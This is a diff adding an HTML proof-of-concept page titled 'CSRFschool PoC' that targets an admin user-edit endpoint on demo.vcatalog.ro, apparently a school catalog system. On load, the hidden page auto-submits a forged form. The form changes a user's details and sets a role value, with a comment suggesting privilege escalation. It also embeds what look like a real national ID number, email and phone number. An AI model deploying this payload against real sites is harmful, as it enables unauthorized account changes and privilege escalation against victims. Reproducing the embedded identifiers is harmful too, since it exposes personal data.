@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="ro">
+<head>
+  <meta charset="utf-8">
+  <title>CSRFschool PoC</title>
+  <style>body{display:none}</style>
+</head>
+<body onload="document.forms[0].submit()">
+  <!-- Make sure this EXACT path matches your captured request -->
+  <form
+    action="https://demo.vcatalog.ro/admin/utilizatori/actiuni/T0g1VXNYK1UydzFQV1BtVUpxNHkxVXhSckJIaUlPRWUzeDhJdGJWYVQ0bTNkVWZ1cnI4MDFDTkthSkNxNlFrMGg1M2Q0Vk1uK1RCMEM5d3I0RG9wREE9PQ=="
+    method="POST"
+    enctype="multipart/form-data"
+    target="sink">
+
+    <!-- File field left empty (optional) -->
+    <input type="file" name="fleImage">
+
+    <!-- Fill fields as you want the victim’s browser to submit -->
+    <input type="hidden" name="nume" value="Radulescu">
+    <input type="hidden" name="prenume" value="CSRFworked">
+    <!-- Try privilege escalation: larger number often means higher role -->
+    <input type="hidden" name="grad" value="4">
+    <input type="hidden" name="cnp" value="2721031010600">
+    <!-- Use HTML entity for ă to avoid encoding surprises -->
+    <input type="hidden" name="email" value="radulescu.veronica@vcatalog.ro">
+    <input type="hidden" name="telefon" value="8843407909">
+    <input type="hidden" name="full_number" value="+408843407909">
+    <input type="hidden" name="user_name" value="demo.director">
+    <input type="hidden" name="status" value="enabled">
+    <input type="hidden" name="btnModify" value="1">
+  </form>
+
+  <iframe name="sink" style="display:none"></iframe>
+</body>
+</html>
